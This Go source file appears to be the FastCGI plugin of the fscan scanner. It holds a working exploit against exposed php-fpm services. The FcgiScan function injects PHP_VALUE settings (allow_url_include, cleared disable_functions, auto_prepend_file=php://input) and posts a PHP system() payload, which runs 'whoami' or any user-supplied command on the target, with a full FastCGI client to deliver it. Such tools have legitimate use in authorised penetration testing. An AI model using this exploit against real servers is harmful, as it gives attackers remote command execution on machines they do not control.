package Plugins

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/shadow1ng/fscan/common"
	"io"
	"strconv"
	"strings"
	"sync"
	"time"
)

//links
//https://xz.aliyun.com/t/9544
//https://github.com/wofeiwo/webcgi-exploits

// escapePhpCommand 将用户命令安全嵌入 PHP 单引号字符串字面量(S8)：
// PHP 单引号字符串内只有 \ 和 ' 具有转义含义，故先转义反斜杠再转义单引号
// (顺序不可反)。转义后 system('...') 拿到的字符串值即用户原始命令，
// 由 shell 正常解释。命令含 NUL 字节视为无法安全嵌入，返回 ok=false，
// 调用方应拒绝执行(不打 [vul])。
func escapePhpCommand(cmd string) (string, bool) {
	if strings.ContainsRune(cmd, 0) {
		return "", false
	}
	s := strings.ReplaceAll(cmd, `\`, `\\`)
	s = strings.ReplaceAll(s, `'`, `\'`)
	return s, true
}

func FcgiScan(info *common.HostInfo) {
	// 本函数只做 FCGI 未授权/命令执行检测，无口令爆破环节：-nobr 不应跳过
	url := "/etc/issue"
	if common.Path != "" {
		url = common.Path
	}
	addr := fmt.Sprintf("%v:%v", info.Host, info.Ports)
	var reqParams string
	var cutLine = "-----ASDGTasdkk361363s-----\n"
	switch {
	case common.Command == "read":
		reqParams = ""
	case common.Command != "":
		// -c 命令嵌入 PHP 单引号字符串 system('...')：含单引号会破坏 PHP
		// 语法导致命令静默不执行(S8)，先做转义；转义后仍无法安全嵌入
		// (含 NUL 字节)时直接打 [-] 并 return，不发起请求、不进入 [vul] 判定。
		escaped, ok := escapePhpCommand(common.Command)
		if !ok {
			errlog := fmt.Sprintf("[-] fcgi %v:%v unsafe -c command rejected (contains NUL byte)", info.Host, info.Ports)
			common.LogError(errlog)
			return
		}
		reqParams = "<?php system('" + escaped + "');die('" + cutLine + "');?>"
	default:
		reqParams = "<?php system('whoami');die('" + cutLine + "');?>"
	}

	env := make(map[string]string)

	env["SCRIPT_FILENAME"] = url
	env["DOCUMENT_ROOT"] = "/"
	env["SERVER_SOFTWARE"] = "go / fcgiclient "
	env["REMOTE_ADDR"] = "127.0.0.1"
	env["SERVER_PROTOCOL"] = "HTTP/1.1"

	if len(reqParams) != 0 {
		env["CONTENT_LENGTH"] = strconv.Itoa(len(reqParams))
		env["REQUEST_METHOD"] = "POST"
		env["PHP_VALUE"] = "allow_url_include = On\ndisable_functions = \nauto_prepend_file = php://input"
	} else {
		env["REQUEST_METHOD"] = "GET"
	}

	fcgi, err := New(addr, common.Timeout)
	defer func() {
		if fcgi.rwc != nil {
			fcgi.rwc.Close()
		}
	}()
	if err != nil {
		errlog := fmt.Sprintf("[-] fcgi %v:%v %v", info.Host, info.Ports, err)
		common.LogError(errlog)
		return
	}

	stdout, stderr, err := fcgi.Request(env, reqParams)
	if err != nil {
		errlog := fmt.Sprintf("[-] fcgi %v:%v %v", info.Host, info.Ports, err)
		common.LogError(errlog)
		return
	}

	//1
	//Content-type: text/html
	//
	//uid=1001(www) gid=1001(www) groups=1001(www)

	//2
	//Status: 404 Not Found
	//Content-type: text/html
	//
	//File not found.
	//Primary script unknown

	//3
	//Status: 403 Forbidden
	//Content-type: text/html
	//
	//Access denied.
	//Access to the script '/etc/passwd' has been denied (see security.limit_extensions)
	var result string
	var output = string(stdout)
	if strings.Contains(output, cutLine) { //命令成功回显
		output = strings.SplitN(output, cutLine, 2)[0]
		if len(stderr) > 0 {
			result = fmt.Sprintf("[vul] FCGI %v:%v \n%vstderr:%v\nplesa try other path,as -path /www/wwwroot/index.php", info.Host, info.Ports, output, string(stderr))
		} else {
			result = fmt.Sprintf("[vul] FCGI %v:%v \n%v", info.Host, info.Ports, output)
		}
		common.LogSuccess(result)
	} else if strings.Contains(output, "File not found") || strings.Contains(output, "Content-type") || strings.Contains(output, "Status") {
		// cutLine 未回显：php-fpm 任何响应都带 Content-type/Status（默认 -path /etc/issue
		// 常回 404/403 头），不能据此判定漏洞，降级为普通提示，仅保留诊断信息
		if len(stderr) > 0 {
			result = fmt.Sprintf("[*] FCGI %v:%v \n%vstderr:%v\nplesa try other path,as -path /www/wwwroot/index.php", info.Host, info.Ports, output, string(stderr))
		} else {
			result = fmt.Sprintf("[*] FCGI %v:%v \n%v\n[*] command output not echoed, please try other path,as -path /www/wwwroot/index.php", info.Host, info.Ports, output)
		}
		common.LogSuccess(result)
	}
}

// for padding so we don't have to allocate all the time
// not synchronized because we don't care what the contents are
var pad [maxPad]byte

const (
	FCGI_BEGIN_REQUEST uint8 = iota + 1
	FCGI_ABORT_REQUEST
	FCGI_END_REQUEST
	FCGI_PARAMS
	FCGI_STDIN
	FCGI_STDOUT
	FCGI_STDERR
)

const (
	FCGI_RESPONDER uint8 = iota + 1
)

const (
	maxWrite = 6553500 // maximum record body
	maxPad   = 255
)

type header struct {
	Version       uint8
	Type          uint8
	Id            uint16
	ContentLength uint16
	PaddingLength uint8
	Reserved      uint8
}

func (h *header) init(recType uint8, reqId uint16, contentLength int) {
	h.Version = 1
	h.Type = recType
	h.Id = reqId
	h.ContentLength = uint16(contentLength)
	h.PaddingLength = uint8(-contentLength & 7)
}

type record struct {
	h   header
	buf [maxWrite + maxPad]byte
}

func (rec *record) read(r io.Reader) (err error) {
	if err = binary.Read(r, binary.BigEndian, &rec.h); err != nil {
		return err
	}
	if rec.h.Version != 1 {
		return errors.New("fcgi: invalid header version")
	}
	n := int(rec.h.ContentLength) + int(rec.h.PaddingLength)
	if _, err = io.ReadFull(r, rec.buf[:n]); err != nil {
		return err
	}
	return nil
}

func (r *record) content() []byte {
	return r.buf[:r.h.ContentLength]
}

type FCGIClient struct {
	mutex     sync.Mutex
	rwc       io.ReadWriteCloser
	h         header
	buf       bytes.Buffer
	keepAlive bool
}

func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
	conn, err := common.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
	if err != nil {
		// 返回非 nil 空 client(rwc 为 nil)，调用方 defer 判空不会 panic
		return &FCGIClient{}, err
	}
	// 连接建立后立即设置整体读写截止时间：对端只 accept 不回包/不关闭时，
	// Request 的读循环会随超时退出，避免 FcgiScan 永久阻塞拖死 wg.Wait()
	if derr := conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second)); derr != nil {
		conn.Close()
		return &FCGIClient{}, derr
	}
	fcgi = &FCGIClient{
		rwc:       conn,
		keepAlive: false,
	}
	return
}

func (c *FCGIClient) writeRecord(recType uint8, reqId uint16, content []byte) (err error) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	c.buf.Reset()
	c.h.init(recType, reqId, len(content))
	if err := binary.Write(&c.buf, binary.BigEndian, c.h); err != nil {
		return err
	}
	if _, err := c.buf.Write(content); err != nil {
		return err
	}
	if _, err := c.buf.Write(pad[:c.h.PaddingLength]); err != nil {
		return err
	}
	_, err = c.rwc.Write(c.buf.Bytes())
	return err
}

func (c *FCGIClient) writeBeginRequest(reqId uint16, role uint16, flags uint8) error {
	b := [8]byte{byte(role >> 8), byte(role), flags}
	return c.writeRecord(FCGI_BEGIN_REQUEST, reqId, b[:])
}

func (c *FCGIClient) writeEndRequest(reqId uint16, appStatus int, protocolStatus uint8) error {
	b := make([]byte, 8)
	binary.BigEndian.PutUint32(b, uint32(appStatus))
	b[4] = protocolStatus
	return c.writeRecord(FCGI_END_REQUEST, reqId, b)
}

func (c *FCGIClient) writePairs(recType uint8, reqId uint16, pairs map[string]string) error {
	w := newWriter(c, recType, reqId)
	b := make([]byte, 8)
	for k, v := range pairs {
		n := encodeSize(b, uint32(len(k)))
		n += encodeSize(b[n:], uint32(len(v)))
		if _, err := w.Write(b[:n]); err != nil {
			return err
		}
		if _, err := w.WriteString(k); err != nil {
			return err
		}
		if _, err := w.WriteString(v); err != nil {
			return err
		}
	}
	w.Close()
	return nil
}

func readSize(s []byte) (uint32, int) {
	if len(s) == 0 {
		return 0, 0
	}
	size, n := uint32(s[0]), 1
	if size&(1<<7) != 0 {
		if len(s) < 4 {
			return 0, 0
		}
		n = 4
		size = binary.BigEndian.Uint32(s)
		size &^= 1 << 31
	}
	return size, n
}

func readString(s []byte, size uint32) string {
	if size > uint32(len(s)) {
		return ""
	}
	return string(s[:size])
}

func encodeSize(b []byte, size uint32) int {
	if size > 127 {
		size |= 1 << 31
		binary.BigEndian.PutUint32(b, size)
		return 4
	}
	b[0] = byte(size)
	return 1
}

// bufWriter encapsulates bufio.Writer but also closes the underlying stream when
// Closed.
type bufWriter struct {
	closer io.Closer
	*bufio.Writer
}

func (w *bufWriter) Close() error {
	if err := w.Writer.Flush(); err != nil {
		w.closer.Close()
		return err
	}
	return w.closer.Close()
}

func newWriter(c *FCGIClient, recType uint8, reqId uint16) *bufWriter {
	s := &streamWriter{c: c, recType: recType, reqId: reqId}
	w := bufio.NewWriterSize(s, maxWrite)
	return &bufWriter{s, w}
}

// streamWriter abstracts out the separation of a stream into discrete records.
// It only writes maxWrite bytes at a time.
type streamWriter struct {
	c       *FCGIClient
	recType uint8
	reqId   uint16
}

func (w *streamWriter) Write(p []byte) (int, error) {
	nn := 0
	for len(p) > 0 {
		n := len(p)
		if n > maxWrite {
			n = maxWrite
		}
		if err := w.c.writeRecord(w.recType, w.reqId, p[:n]); err != nil {
			return nn, err
		}
		nn += n
		p = p[n:]
	}
	return nn, nil
}

func (w *streamWriter) Close() error {
	// send empty record to close the stream
	return w.c.writeRecord(w.recType, w.reqId, nil)
}

func (c *FCGIClient) Request(env map[string]string, reqStr string) (retout []byte, reterr []byte, err error) {

	var reqId uint16 = 1
	defer c.rwc.Close()

	err = c.writeBeginRequest(reqId, uint16(FCGI_RESPONDER), 0)
	if err != nil {
		return
	}
	err = c.writePairs(FCGI_PARAMS, reqId, env)
	if err != nil {
		return
	}
	if len(reqStr) > 0 {
		err = c.writeRecord(FCGI_STDIN, reqId, []byte(reqStr))
		if err != nil {
			return
		}
	}

	rec := &record{}
	var err1 error

	// recive untill EOF or FCGI_END_REQUEST
	for {
		err1 = rec.read(c.rwc)
		if err1 != nil {
			if err1 != io.EOF {
				err = err1
			}
			break
		}
		switch {
		case rec.h.Type == FCGI_STDOUT:
			retout = append(retout, rec.content()...)
		case rec.h.Type == FCGI_STDERR:
			reterr = append(reterr, rec.content()...)
		case rec.h.Type == FCGI_END_REQUEST:
			fallthrough
		default:
			break
		}
	}

	return
}
